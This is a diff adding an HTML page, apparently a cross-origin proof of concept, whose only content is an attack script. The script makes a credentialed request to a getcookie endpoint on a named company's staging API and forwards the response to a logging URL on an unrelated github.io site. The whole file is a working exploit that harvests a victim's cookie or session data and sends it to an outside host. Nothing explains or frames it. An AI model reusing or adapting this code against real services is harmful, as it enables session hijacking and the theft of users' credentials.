@@ -1,0 +1,15 @@
+<html>
+  <body>
+    <script> 
+       var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://rts-staging.freshworksapi.com/getcookie',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='//hemar0605.github.io/secondsite/log?key='+this.responseText; 
+   };
+ </script>
+  </body>
+</html>
